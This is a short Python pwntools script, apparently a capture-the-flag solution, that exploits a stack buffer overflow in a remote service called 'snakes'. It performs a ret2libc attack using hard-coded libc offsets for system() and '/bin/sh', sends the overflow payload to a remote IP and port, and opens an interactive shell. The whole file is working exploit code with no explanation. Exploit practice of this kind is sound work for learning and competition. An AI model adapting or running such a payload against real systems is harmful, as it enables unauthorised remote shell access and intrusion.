#!/usr/bin/env python

from pwn import *

LIBC_BASE_ADDR = 0xf7e19000

SYSTEM_OFFSET = 0x0003a940
BIN_SH_OFFSET = 0x15902b

def recv_response(p):
    r = p.recv()
    print "[+] Response: " + r
    return r

p = remote("35.237.220.217", 1338)
# p = process("./snakes")

recv_response(p)

system_addr = LIBC_BASE_ADDR + SYSTEM_OFFSET
bin_sh_addr = LIBC_BASE_ADDR + BIN_SH_OFFSET

buf = "51 "
buf += "a" * 0x30
buf += p32(system_addr)
buf += "b" * 4     # dummy return address following 32 bit calling conventions
buf += p32(bin_sh_addr)

p.sendline(buf)
# recv_response(p)

p.interactive()
